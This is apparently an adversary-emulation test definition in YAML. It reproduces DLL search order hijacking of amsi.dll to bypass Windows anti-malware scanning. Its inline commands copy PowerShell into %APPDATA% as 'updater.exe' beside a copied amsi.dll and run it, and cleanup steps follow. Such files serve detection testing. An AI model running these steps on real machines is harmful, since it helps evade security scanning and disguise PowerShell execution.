api_version: "2.0"
name: DLL Search Order Hijacking - amsi.dll
description: |
    Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
    https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/

    Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.
uuid: 8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1574: Hijack Execution Flow'
    subtechniques:
        - 'T1574.001: DLL Search Order Hijacking'
requirements:
    platforms:
        - os: windows
steps:
    - name: dll-search-order-hijacking---amsi.dll
      inline: |
        copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        %APPDATA%\updater.exe -Command exit
      executor: command_prompt
      cleanup:
        inline: |
            del %APPDATA%\updater.exe >nul 2>&1
            del %APPDATA%\amsi.dll >nul 2>&1
        executor: command_prompt
